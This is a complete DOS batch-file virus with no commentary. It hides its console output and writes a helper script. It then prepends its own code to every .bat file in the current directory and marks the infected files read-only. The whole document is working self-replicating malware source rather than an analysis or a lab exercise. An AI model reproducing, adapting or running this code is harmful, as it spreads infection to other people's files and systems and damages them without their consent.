@ctty nul
echo if [%%1]==[INFECT.BAT] goto fuckit > infect.bat
echo del something.tmp >> infect.bat
echo copy /b %%1 something.tmp >> infect.bat
echo del %%1 >> infect.bat
echo copy /b %0 + %0.bat + something.tmp %%1 >> infect.bat
echo del something.tmp >> infect.bat
echo attrib +r %%1 >> infect.bat
echo :fuckit >> infect.bat
for %%f in (*.bat) do call infect.bat %%f
del infect.bat
ctty con

